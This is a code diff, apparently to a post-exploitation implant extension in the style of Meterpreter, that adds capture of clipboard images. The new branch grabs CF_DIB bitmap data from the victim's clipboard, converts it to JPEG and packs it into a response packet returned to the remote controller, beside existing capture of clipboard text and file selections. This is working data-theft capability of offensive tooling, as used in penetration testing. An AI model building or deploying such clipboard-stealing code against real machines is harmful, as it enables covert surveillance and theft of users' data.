@@ -4,6 +4,7 @@
  */
 #include "extapi.h"
 #include "clipboard.h"
+#include "clipboard_image.h"
 
 #ifdef _WIN32
 /*! @brief GlobalAlloc function pointer type. */
@@ -54,7 +55,8 @@ typedef BOOL (WINAPI * PGETFILESIZEEX)( HANDLE hFile, PLARGE_INTEGER lpFileSize 
 /*!
  * @brief Handle the request to get the data from the clipboard.
  * @details This function currently only supports the following clipboard data formats:
- *             - CF_TEXT - raw text data.
+ *             - CF_TEXT  - raw text data.
+ *             - CF_DIB   - bitmap/image information.
  *             - CF_HDROP - file selection.
  *
  *          Over time more formats will be supported.
@@ -93,6 +95,8 @@ DWORD request_clipboard_get_data( Remote *remote, Packet *packet )
 	CHAR lpFileName[MAX_PATH];
 	Tlv entries[2] = {0};
 	LARGE_INTEGER largeInt = {0};
+	LPBITMAPINFO lpBI = NULL;
+	ConvertedImage image;
 
 
 	Packet *pResponse = packet_create_response( packet );
@@ -148,6 +152,28 @@ DWORD request_clipboard_get_data( Remote *remote, Packet *packet )
 
 					dprintf( "Clipboard text captured: %s", lpClipString );
 					packet_add_tlv_string( pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, lpClipString );
+
+					pGlobalUnlock( hClipboardData );
+				}
+			}
+			else if( uFormat == CF_DIB ) {
+				// an image of some kind is on the clipboard
+				dprintf( "Grabbing the clipboard bitmap data" );
+				if ( (hClipboardData = pGetClipboardData( CF_DIB ) ) != NULL
+					&& (lpBI = (LPBITMAPINFO)pGlobalLock( hClipboardData )) != NULL ) {
+
+					if( convert_to_jpg( lpBI, (LPVOID)(lpBI + 1), 80, &image ) == ERROR_SUCCESS ) {
+
+						dprintf( "Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize );
+						packet_add_tlv_raw( pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_JPG, image.pImageBuffer, image.dwImageBufferSize );
+
+						// Just leaving this in for debugging purposes later on
+						//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+						//WriteFile(hSourceFile, image.pImageBuffer, image.dwImageBufferSize, &largeInt.LowPart, NULL);
+						//CloseHandle(hSourceFile);
+
+						free( image.pImageBuffer );
+					}
 
 					pGlobalUnlock( hClipboardData );
 				}
